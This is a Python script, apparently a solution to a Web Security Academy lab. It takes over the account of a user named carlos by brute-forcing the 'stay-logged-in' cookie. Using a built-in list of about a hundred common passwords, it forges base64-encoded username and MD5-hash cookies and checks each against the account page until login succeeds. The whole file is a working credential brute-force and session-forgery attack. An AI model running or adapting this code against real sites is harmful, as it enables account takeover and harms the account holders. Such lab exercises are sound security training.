import requests
import sys
from hashlib import md5
import base64



def bruteforce_cookie(url, session):
    passwords = [
        b"123456", b"password", b"12345678", b"qwerty", b"123456789", b"12345", b"1234", b"111111", b"1234567",
        b"dragon", b"123123", b"baseball", b"abc123", b"football", b"monkey", b"letmein", b"shadow", b"master",
        b"666666", b"qwertyuiop", b"123321", b"mustang", b"1234567890", b"michael", b"654321", b"superman", b"1qaz2wsx",
        b"7777777", b"121212", b"000000",b"qazwsx", b"123qwe", b"killer", b"trustno1", b"jordan", b"jennifer",
        b"zxcvbnm", b"asdfgh", b"hunter", b"buster", b"soccer", b"harley", b"batman", b"andrew", b"tigger", b"sunshine",
        b"iloveyou", b"2000", b"charlie", b"robert", b"thomas", b"hockey", b"ranger", b"daniel", b"starwars", b"klaster",
        b"112233", b"george", b"computer", b"michelle", b"jessica", b"pepper", b"1111", b"zxcvbn", b"555555",
        b"11111111", b"131313", b"freedom", b"777777", b"pass", b"maggie", b"159753", b"aaaaaa", b"ginger", b"princess",
        b"joshua", b"cheese", b"amanda", b"summer", b"love", b"ashley", b"nicole", b"chelsea", b"biteme", b"matthew",
        b"access", b"yankees", b"987654321", b"dallas", b"austin", b"thunder", b"taylor", b"matrix", b"mobilemail",
        b"mom", b"monitor", b"monitoring", b"montana", b"moon", b"moscow"
    ]

    for i in range(len(passwords)):
        hashed_password = md5(passwords[i]).hexdigest()
        string = f"carlos:{hashed_password}"
        cookie = base64.b64encode(string.encode()).decode()

        response = session.get(f"{url}/my-account?id=carlos", cookies={"stay-logged-in": cookie}, timeout=10)
        if "Your username is: carlos" in response.text:
            return cookie


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Brute-forcing Carlos's stay logged in cookie...")
        cookie = bruteforce_cookie(url, session)
        if cookie:
            print(f"(+) Cookie found: {cookie}")
        else:
            print("(-) Something went wrong. Please check your URL and try again.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()
